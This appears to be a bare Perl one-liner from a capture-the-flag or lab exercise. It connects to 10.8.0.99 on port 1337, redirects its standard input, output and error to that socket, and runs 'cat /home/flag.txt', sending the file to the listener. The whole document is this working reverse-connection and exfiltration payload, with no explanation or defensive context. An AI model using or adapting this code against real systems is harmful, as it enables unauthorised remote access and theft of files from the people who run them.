perl -e 'use Socket;$i="10.8.0.99";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    select(S); $|=1;
    print S "=== Connected ===\n";
    open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
    system("cat /home/flag.txt");
};'
